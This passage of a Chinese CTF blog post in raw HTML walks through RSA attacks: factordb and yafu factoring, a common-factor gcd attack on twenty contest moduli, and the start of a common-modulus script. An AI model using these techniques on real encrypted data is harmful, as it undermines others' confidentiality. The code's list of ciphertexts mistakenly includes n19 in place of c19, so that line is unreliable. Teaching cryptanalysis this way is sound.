rel=\"noopener\">https://factordb.com/</a></p>\n<p>api接口：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http://factordb.com/api?query=12345</span><br><span class=\"line\"></span><br><span class=\"line\">response:</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;id&quot;:&quot;12345&quot;,&quot;status&quot;:&quot;FF&quot;,&quot;factors&quot;:[[&quot;3&quot;,1],[&quot;5&quot;,1],[&quot;823&quot;,1]]&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"使用yafu分解N\"><a href=\"#使用yafu分解N\" class=\"headerlink\" title=\"使用yafu分解N\"></a>使用yafu分解N</h2><p>适用情况：p,q相差较大或较小时可快速分解。</p>\n<p>使用方法：yafu-x64.exe factor(233) ，yafu-x64.exe help</p>\n<p>url: <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## 模不互素 （gcd(N1,N2)!=1）</span><br><span class=\"line\"></span><br><span class=\"line\">适用情况：存在两个或更多模数 ，且gcd(N1,N2)!=1 。</span><br><span class=\"line\"></span><br><span class=\"line\">多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一gcd(N1,N2) ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。实现参照本文欧几里得算法 部分和RSA解密 部分。</span><br><span class=\"line\"></span><br><span class=\"line\">案例: 安恒2018 6月赛:</span><br><span class=\"line\"></span><br><span class=\"line\">该题目提供20个n和20个相对应的密文，由于e为65537，所以可以排除低指数广播攻击，通过分析，可以发现n4和n17并非互质，所以可以使用模不互素进行解密。</span><br><span class=\"line\"></span><br><span class=\"line\">```python</span><br><span class=\"line\"># -*- coding:utf8</span><br><span class=\"line\">import gmpy2</span><br><span class=\"line\">import sys</span><br><span class=\"line\">from libnum import gcd, n2s</span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\">n = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span><br><span class=\"line\">c = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span><br><span class=\"line\"></span><br><span class=\"line\">n1 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span><br><span class=\"line\">c1 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span><br><span class=\"line\"></span><br><span class=\"line\">n2 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span><br><span class=\"line\">c2 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span><br><span class=\"line\"></span><br><span class=\"line\">n3 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span><br><span class=\"line\">c3 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span><br><span class=\"line\"></span><br><span class=\"line\">n4 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span><br><span class=\"line\">c4 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span><br><span class=\"line\"></span><br><span class=\"line\">n5 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span><br><span class=\"line\">c5 = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span><br><span class=\"line\"></span><br><span class=\"line\">n6 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span><br><span class=\"line\">c6 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span><br><span class=\"line\"></span><br><span class=\"line\">n7 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span><br><span class=\"line\">c7 = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span><br><span class=\"line\"></span><br><span class=\"line\">n8 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span><br><span class=\"line\">c8 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span><br><span class=\"line\"></span><br><span class=\"line\">n9 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span><br><span class=\"line\">c9 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span><br><span class=\"line\"></span><br><span class=\"line\">n10 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span><br><span class=\"line\">c10 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span><br><span class=\"line\"></span><br><span class=\"line\">n11 = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span><br><span class=\"line\">c11 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span><br><span class=\"line\"></span><br><span class=\"line\">n12 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span><br><span class=\"line\">c12 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span><br><span class=\"line\"></span><br><span class=\"line\">n13 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span><br><span class=\"line\">c13 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span><br><span class=\"line\"></span><br><span class=\"line\">n14 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span><br><span class=\"line\">c14 = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span><br><span class=\"line\"></span><br><span class=\"line\">n15 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span><br><span class=\"line\">c15 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span><br><span class=\"line\"></span><br><span class=\"line\">n16 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span><br><span class=\"line\">c16 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span><br><span class=\"line\"></span><br><span class=\"line\">n17 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span><br><span class=\"line\">c17 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span><br><span class=\"line\"></span><br><span class=\"line\">n18 = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span><br><span class=\"line\">c18 = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span><br><span class=\"line\"></span><br><span class=\"line\">n19 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659L</span><br><span class=\"line\">c19 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346L</span><br><span class=\"line\"></span><br><span class=\"line\"># e = 65537</span><br><span class=\"line\"></span><br><span class=\"line\">nlist = [n, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16, n17, n18, n19]</span><br><span class=\"line\">clist = [c, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, n19]</span><br><span class=\"line\"></span><br><span class=\"line\"># 寻找n-n19之间是否有互素的两个数</span><br><span class=\"line\">for i in range(20):</span><br><span class=\"line\">\tfor j in range(20):</span><br><span class=\"line\">\t\tif i == j:</span><br><span class=\"line\">\t\t\tcontinue</span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tprint i, j, gcd(nlist[i], nlist[j])</span><br><span class=\"line\"></span><br><span class=\"line\">p = 132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499</span><br><span class=\"line\">q = 147764243536346715659432105628869451579704787136671496082719136693967862981444027430286693715470058237766749929595449234542432638995582675309345203650862074805309250048791833572328389815134763390112740125416594657830110772787259287349943894208620126222405887247024583782974900764827221144394822451457152873527</span><br><span class=\"line\"># n17 = p1 * p2</span><br><span class=\"line\">print gmpy2.is_prime(132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499)</span><br><span class=\"line\"></span><br><span class=\"line\">print gmpy2.is_prime(147764243536346715659432105628869451579704787136671496082719136693967862981444027430286693715470058237766749929595449234542432638995582675309345203650862074805309250048791833572328389815134763390112740125416594657830110772787259287349943894208620126222405887247024583782974900764827221144394822451457152873527)</span><br><span class=\"line\"></span><br><span class=\"line\"># m = random.randint(0x100000000000, 0xffffffffffff)b</span><br><span class=\"line\"># </span><br><span class=\"line\">def rsa_decrypt(e, c, p, q):</span><br><span class=\"line\">    phi = (p - 1) * (q - 1)</span><br><span class=\"line\">    n = p * q</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        d = gmpy2.invert(e, phi) #求e模phi的逆</span><br><span class=\"line\">        return pow(c, d, n)</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        print &quot;e and phi are not coprime!&quot;</span><br><span class=\"line\">        raise e</span><br><span class=\"line\">e = 65537</span><br><span class=\"line\">print n2s(rsa_decrypt(e, c17, p, q))</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"共模攻击\"><a href=\"#共模攻击\" class=\"headerlink\" title=\"共模攻击\"></a>共模攻击</h2><p>适用情况：明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># by https://findneo.github.io/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> libnum</span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fix_py</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># decode encryption.encrypted</span></span><br><span class=\"line\">    s1 = <span class=\"string\">'abdefghijklmpqrtuvwxyz'</span></span><br><span class=\"line\">    s2 = <span class=\"string\">'dmenwfoxgpyhirasbktclu'</span></span><br><span class=\"line\">    f1 = open(<span class=\"string\">'encryption.encrypted'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">'encryption.py'</span>, <span class=\"string\">'w'</span>) <span class=\"keyword\">as</span> f2:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> f1.readlines():</span><br><span class=\"line\">            tmp = <span class=\"string\">''</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">                tmp += s2[s1.index(j)] <span class=\"keyword\">if</span> j <span class=\"keyword\">in</span> s1 <span class=\"keyword\">else</span> j</span><br><span class=\"line\">            f2.write(tmp)</span><br><span class=\"line\"><span class=\"comment\"># fix_py()</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">common_modulus</span><span class=\"params\">(n, e1, e2, c1, c2)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (libnum.gcd(e1, e2) == <span class=\"number\">1</span>)</span><br><span 